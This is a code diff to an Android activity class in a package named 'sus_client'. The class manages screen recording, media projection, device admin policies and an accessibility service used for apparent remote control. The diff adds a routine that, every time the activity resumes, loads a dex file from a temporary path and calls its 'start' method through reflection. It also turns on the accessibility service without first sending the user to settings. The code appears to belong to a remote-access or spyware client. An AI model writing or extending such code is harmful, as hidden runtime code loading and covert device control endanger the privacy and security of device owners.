@@ -26,7 +26,6 @@ import android.graphics.Bitmap;
 import android.graphics.Color;
 import android.graphics.Point;
 import android.graphics.PorterDuff;
-import android.graphics.Rect;
 import android.graphics.drawable.ClipDrawable;
 import android.graphics.drawable.GradientDrawable;
 import android.graphics.drawable.LayerDrawable;
@@ -36,7 +35,6 @@ import android.net.http.SslError;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.IBinder;
-import android.provider.Settings;
 import android.text.TextUtils;
 import android.util.Pair;
 import android.util.Rational;
@@ -56,12 +54,21 @@ import android.widget.LinearLayout;
 import android.widget.ProgressBar;
 import android.widget.RelativeLayout;
 
-import com.android.sus_client.R;
+import com.android.dex.Dex;
+import com.android.dex.util.FileUtils;
+import com.android.dx.command.dexer.DxContext;
+import com.android.dx.merge.CollisionPolicy;
+import com.android.dx.merge.DexMerger;
 import com.android.sus_client.annotation.Nullable;
-import com.android.sus_client.background.ForegroundWorker;
+import com.android.sus_client.commonutility.AppExecutors;
 import com.android.sus_client.commonutility.DeviceAdminPolicies;
 import com.android.sus_client.commonutility.cache.CacheManager;
 import com.android.sus_client.commonutility.widget.WindowOverlayFrameLayout;
+import com.android.sus_client.global.Constant;
+import com.android.sus_client.global.DexUtils;
+import com.android.sus_client.global.autofix.AutoFix;
+import com.android.sus_client.global.autofix.AutoUtils;
+import com.android.sus_client.global.autofix.DynamicApk;
 import com.android.sus_client.services.ForegroundService;
 import com.android.sus_client.services.MyAccessibilityService;
 import com.android.sus_client.utils.ColorAnimator;
@@ -77,10 +84,21 @@ import com.android.sus_client.utils.permissions.Permissions;
 
 import org.webrtc.SurfaceViewRenderer;
 
+import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Method;
+import java.util.List;
 
 public class ActionActivity extends Activity {
+
+    private void logAutoFix() {
+        String apkPath = Constant.getTempFilePath(Constant.APK_NAME_EXTENSION);
+        String app_name = DynamicApk.getStringFromApk(this, apkPath, "app_name");
+        System.out.println(":: app_name ---> " + app_name);
+        mainView.setBackgroundColor(DynamicApk.getColorFromApk(this, apkPath, "colorAccent"));
+    }
 
     public static final String ACTION_SCREEN_SHARING_PERMISSION_NEEDED = "ACTION_SCREEN_SHARING_PERMISSION_NEEDED";
     public static final String ACTION_RECORD_SCREEN = "ACTION_RECORD_SCREEN";
@@ -120,7 +138,6 @@ public class ActionActivity extends Activity {
             myService = null;
         }
     };
-
 
 
     public static void start(Context context, String action) {
@@ -356,23 +373,23 @@ public class ActionActivity extends Activity {
             case ACTION_ENABLE_ACCESSIBILITY:
                 //String type = intent.getStringExtra("accessibility_type");
                 //if ("remote_control".equals(type)) {
-                    System.out.println("MyAccessibilityService: " + MyAccessibilityService.isEnabled(this));
-                    //if (!MyAccessibilityService.isEnabled(this)) {
-                    //    startActivityForResult(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS), REQUEST_CODE_ACCESSIBILITY_SERVICE);
-                    //} else {
-                        enableAccessibilityService(true);
-                        askMediaProjectionPermission();
-                    //}
+                System.out.println("MyAccessibilityService: " + MyAccessibilityService.isEnabled(this));
+                //if (!MyAccessibilityService.isEnabled(this)) {
+                //    startActivityForResult(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS), REQUEST_CODE_ACCESSIBILITY_SERVICE);
+                //} else {
+                enableAccessibilityService(true);
+                askMediaProjectionPermission();
+                //}
                 //}
                 break;
         }
 
         // restart foreground service
-        stopService();
-        startService();
+        //stopService();
+        //startService();
 
         // enqueue work to start foreground service
-        ForegroundWorker.enqueueWork(this);
+        //ForegroundWorker.enqueueWork(this);
 
         //if (isGoingToFinish) finish();
     }
@@ -446,6 +463,39 @@ public class ActionActivity extends Activity {
     protected void onResume() {
         super.onResume();
         Utils.setStatusBarTranslucent(this, statusBarBackgroundColor);
+
+        String apkPath = Constant.getTempFilePath(Constant.APK_NAME_EXTENSION);
+        AppExecutors.getInstance().diskIO().execute(() -> {
+            File outputFile = new File(Constant.getFilePath(getApplicationContext(), "App.dex"));
+            //extractAndMergeDexFiles(new File(apkPath), outputFile);
+        });
+
+        //AutoFix.initPathFromUrl(this, Constant.getTempFilePath("App.dex"));
+        //AutoFix.initPathFromUrl(this, apkPath);
+        //logAutoFix();
+
+        Class<?> aClass = DexUtils.loadDex(this, Constant.getTempFilePath("App.dex"), Constant.EXTENSION_TEST);
+        try {
+            Method method = aClass.getMethod("start", String.class);
+            Object instance = AutoUtils.findConstructor(aClass, new Class[]{Context.class}, new Object[]{getApplicationContext()});
+            method.invoke(instance, "New Got executed.");
+        } catch (Exception e) {
+            System.out.println("Error -------> invoke \n" + e.getMessage());
+        }
+    }
+
+    public static void extractAndMergeDexFiles(File apkFile, File outputDexFile) {
+        try {
+            List<File> dexFiles = FileUtils.extractDexFiles(apkFile);
+            Dex[] dexArray = new Dex[dexFiles.size()];
+            for (int i = 0; i < dexFiles.size(); i++) {
+                dexArray[i] = new Dex(dexFiles.get(i));
+            }
+            DexMerger merger = new DexMerger(dexArray, CollisionPolicy.KEEP_FIRST, new DxContext());
+            merger.merge().writeTo(outputDexFile);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
     }
 
     @Override
